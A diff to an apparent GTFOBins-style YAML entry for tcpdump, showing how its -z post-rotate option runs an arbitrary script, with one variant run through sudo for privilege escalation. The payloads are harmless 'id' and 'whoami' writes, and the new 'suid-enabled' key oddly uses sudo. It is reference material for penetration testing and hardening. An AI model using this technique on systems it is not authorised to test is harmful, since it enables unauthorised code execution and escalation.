@@ -1,9 +1,17 @@
 ---
 functions:
   execute-non-interactive:
-    - code: echo "whoami > /tmp/whoami" > /tmp/tmpfile
-            tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
-  sudo-enabled:
-    - code: echo "whoami > /tmp/whoami" > /tmp/tmpfile
-            sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
+    - code: |
+        COMMAND='id > /tmp/output'
+        TF=$(mktemp -u)
+        echo "$COMMAND" > $TF
+        chmod +x $TF
+        tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
+  suid-enabled:
+    - code: |
+        COMMAND='id > /tmp/output'
+        TF=$(mktemp -u)
+        echo "$COMMAND" > $TF
+        chmod +x $TF
+        sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
 ---
